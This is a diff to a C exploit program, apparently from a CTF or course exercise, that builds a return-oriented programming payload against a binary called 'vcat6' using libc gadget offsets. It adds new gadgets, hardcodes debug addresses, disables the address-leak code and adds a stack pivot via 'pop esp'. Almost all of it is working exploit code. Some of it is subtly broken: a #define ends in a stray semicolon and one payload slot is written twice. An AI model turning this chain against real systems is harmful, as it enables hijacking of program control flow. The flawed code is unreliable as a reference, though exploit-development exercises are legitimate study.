@@ -56,6 +56,14 @@
 #define gadget8_OFF			0x1618e2
 #define gadget9_OFF			0xbfd5c
 
+#define gadget10_OFF		0x43c40
+#define gadget11_OFF		0x301b6
+#define gadget12_OFF		0x13d966
+#define gadget13_OFF		0x103bf0
+#define gadget14_OFF		0xb414d
+
+#define fmt_plain_OFF		0x155e;
+
 //Gadget 2: 0x00043888 : mov dword ptr [edx], ecx ; ret
 //Gadget 3: 0x00030a7b : pop ecx ; pop edx ; ret
 
@@ -65,6 +73,12 @@
 //Gadget 7: 0x0001dc22 : pop ebx ; ret
 //Gadget 8: 0x001618e2 : add ebx, eax ; add eax, 2 ; ret
 //Gadget 9: 0x000bfd5c : mov dword ptr [eax], ebx ; xor eax, eax ; pop ebx ; ret
+
+//Gadget 10: 0x00043c40 : sub eax, 1 ; ret
+//Gadget 11: 0x000301b6 : push eax ; ret
+//Gadget 12: 0x0013d966 : pop esp ; ret
+//Gadget 13: 0x00103bf0 : pop ecx ; pop eax ; ret
+//Gadget 14: 0x000b414d : dec eax ; pop ebx ; ret
 
 // We have exactly 64 bytes to work with in our payload (it's 68 bytes total)
 unsigned char payload[] =
@@ -97,35 +111,35 @@ main(int argc, char **argv)
 	memset(buf, 0, BUF_SZ);
 
 	/* DEBUG MODE ONLY: */
-	// baddr = 0x41000000;
-	// laddr = 0xb7d8d000;
-	// staddr = 0xbffdf000;
+	baddr = 0x41000000;
+	laddr = 0xb7d8d000;
+	staddr = 0xbffdf000;
 
 	/* For NON-DEBUG MODE ONLY:	*/
 
 	/* leak the base address of `vcat6'	*/
-	write(STDOUT_FILENO, FMT_STR, strlen(FMT_STR));
-	read(STDIN_FILENO, buf, BUF_SZ-1);
-	baddr = strtoul(buf, NULL, 16) - BIN_BASE_OFF;
+	// write(STDOUT_FILENO, FMT_STR, strlen(FMT_STR));
+	// read(STDIN_FILENO, buf, BUF_SZ-1);
+	// baddr = strtoul(buf, NULL, 16) - BIN_BASE_OFF;
 
-	/* leak the base address of 'libc-2.31.so'	*/
-	read(STDIN_FILENO, buf, BUF_SZ-1);
-	laddr = strtoul(buf, NULL, 16) - LIBC_BASE_OFF;
+	// /* leak the base address of 'libc-2.31.so'	*/
+	// read(STDIN_FILENO, buf, BUF_SZ-1);
+	// laddr = strtoul(buf, NULL, 16) - LIBC_BASE_OFF;
 
-	/* leak the base address of the stack	*/
-	read(STDIN_FILENO, buf, BUF_SZ-1);
-	staddr = strtoul(buf, NULL, 16) - LIBC_BASE_OFF;
+	// /* leak the stack address	*/
+	// read(STDIN_FILENO, buf, BUF_SZ-1);
+	// staddr = strtoul(buf, NULL, 16);
 
-	/* sanity check 			*/
-	if (!fstat(STDIN_FILENO, &istat) && !S_ISFIFO(istat.st_mode)) {
-		if (!baddr || !laddr) {
-			fprintf(stderr,
-				"[-] baddr = 0x%08lx, laddr = 0x%08lx\n", baddr, laddr);
-			fprintf(stderr,
-				"[!] If you are debugging your exploit under GDB "
-				"you need to type in the leaked addresses\n");
-		}
-	}
+	// /* sanity check 			*/
+	// if (!fstat(STDIN_FILENO, &istat) && !S_ISFIFO(istat.st_mode)) {
+	// 	if (!baddr || !laddr) {
+	// 		fprintf(stderr,
+	// 			"[-] baddr = 0x%08lx, laddr = 0x%08lx\n", baddr, laddr);
+	// 		fprintf(stderr,
+	// 			"[!] If you are debugging your exploit under GDB "
+	// 			"you need to type in the leaked addresses\n");
+	// 	}
+	// }
 
 	/* Time to create the payload!!!!	*/
 	unsigned long addr_aslr;
@@ -141,16 +155,16 @@ main(int argc, char **argv)
 	addr_aslr = baddr + rnd1_OFF;
 	memcpy(payload + 4, &addr_aslr, sizeof(addr_aslr));
 
-	// Pop address of rnd2 into ebx
-	addr_aslr = laddr + gadget7_OFF;
+	// Get value of rnd1 into eax
+	addr_aslr = laddr + gadget5_OFF;
 	memcpy(payload + 8, &addr_aslr, sizeof(addr_aslr));
+
+	// Modify the value by subtracting 1 and popping address into ebx
+	addr_aslr = laddr + gadget14_OFF;
+	memcpy(payload + 12, &addr_aslr, sizeof(addr_aslr));
 
 	// Address of rnd2
 	addr_aslr = baddr + rnd2_OFF - 0x5e;
-	memcpy(payload + 12, &addr_aslr, sizeof(addr_aslr));
-
-	// Get value of rnd1 into eax
-	addr_aslr = laddr + gadget5_OFF;
 	memcpy(payload + 16, &addr_aslr, sizeof(addr_aslr));
 
 	// Get value of rnd2 into ebx
@@ -173,13 +187,29 @@ main(int argc, char **argv)
 	addr_aslr = laddr + gadget9_OFF;
 	memcpy(payload + 36, &addr_aslr, sizeof(addr_aslr));
 
-	// Garbage (there's an extra pop)
-	addr_aslr = 0xdeadbeef;
+	// Fill with old value of ebx
+	addr_aslr = baddr + 0x4000;
 	memcpy(payload + 40, &addr_aslr, sizeof(addr_aslr));
 
-	// Invoke Flag3
-	addr_aslr = baddr + flag3_OFF;
+	// Pop ecx, followed by pop eax (uncorrupt the values)
+	addr_aslr = laddr + gadget13_OFF;
 	memcpy(payload + 44, &addr_aslr, sizeof(addr_aslr));
+
+	// Value into EAX
+	addr_aslr = baddr + fmt_plain_OFF;
+	memcpy(payload + 48, &addr_aslr, sizeof(addr_aslr));
+
+	// Value into ECX
+	addr_aslr = staddr - 0x3c;
+	memcpy(payload + 52, &addr_aslr, sizeof(addr_aslr));
+
+	// Pop esp to return control flow
+	addr_aslr = laddr + gadget12_OFF;
+	memcpy(payload + 56, &addr_aslr, sizeof(addr_aslr));
+
+	// Value to pop into Esp
+	addr_aslr = staddr - 0x5c;
+	memcpy(payload + 56, &addr_aslr, sizeof(addr_aslr));
 
 	/*
 	 * dump the payload in 'stdout'
